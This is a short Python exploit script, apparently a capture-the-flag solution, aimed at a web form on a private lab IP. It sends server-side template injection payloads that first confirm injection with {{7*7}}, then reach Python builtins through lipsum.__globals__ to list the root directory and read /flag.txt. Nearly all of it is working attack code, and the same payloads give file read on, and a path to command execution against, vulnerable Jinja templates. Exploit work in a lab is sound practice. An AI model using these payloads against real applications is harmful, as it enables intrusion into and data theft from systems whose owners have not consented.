#!/usr/bin/env python3
import requests
import html

TARGET = "http://10.42.99.10:5000/"

def send_payload(payload: str) -> str:
    resp = requests.post(TARGET, data={"user": payload})
    # Extract the last <option> value from the response
    import re
    match = re.findall(r'value="([^"]*)"', resp.text)
    if match:
        return html.unescape(match[-1])
    return resp.text


if __name__ == "__main__":
    # Step 1: Verify SSTI works
    print("[*] Testing SSTI with {{7*7}} ...")
    result = send_payload("{{7*7}}")
    print(f"    Result: {result}")

    # Step 2: Access __globals__ via lipsum to reach builtins
    print("[*] Enumerating root directory ...")
    payload = '{{lipsum.__globals__["__builtins__"]["__import__"]("os").listdir("/")}}'
    result = send_payload(payload)
    print(f"    Files: {result}")

    # Step 3: Read the flag
    print("[*] Reading /flag.txt ...")
    payload = '{{lipsum.__globals__["__builtins__"]["open"]("/flag.txt").read()}}'
    result = send_payload(payload)
    print(f"    FLAG: {result}")
